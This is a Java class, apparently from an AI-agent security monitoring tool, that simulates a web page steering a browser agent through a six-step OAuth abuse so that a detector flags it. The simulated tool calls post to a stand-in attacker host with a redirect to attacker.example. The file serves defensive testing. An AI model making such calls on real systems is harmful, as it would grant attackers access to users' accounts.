package com.sentinelmesh.adversary.scenarios;

import com.sentinelmesh.adversary.AgentSimulator;
import org.springframework.stereotype.Component;

import java.util.List;
import java.util.Map;
import java.util.UUID;

@Component
public class MaliciousWorkflowScenario implements AttackScenario {

    @Override public String id() { return "malicious_workflow"; }
    @Override public String displayName() { return "Malicious Browser Workflow"; }
    @Override public String description() {
        return "Page tries to drive the agent through a 6-step OAuth abuse — detected as a behavioral anomaly.";
    }

    @Override
    public void play(UUID sessionId, AgentSimulator sim) {
        sim.plan(sessionId, "Connect calendar integration",
                Map.of("steps", List.of("oauth", "list_events", "send_invite")));
        sim.sleep(180);

        // A burst of rapid-fire calls to a tool the agent rarely uses.
        for (int i = 0; i < 6; i++) {
            sim.toolCall(sessionId, "http.post",
                    Map.of("url", "https://oauth.evil-hotel.local/grant?step=" + i,
                            "body", Map.of("redirect", "https://attacker.example/cb")));
            sim.sleep(80);
        }
    }
}
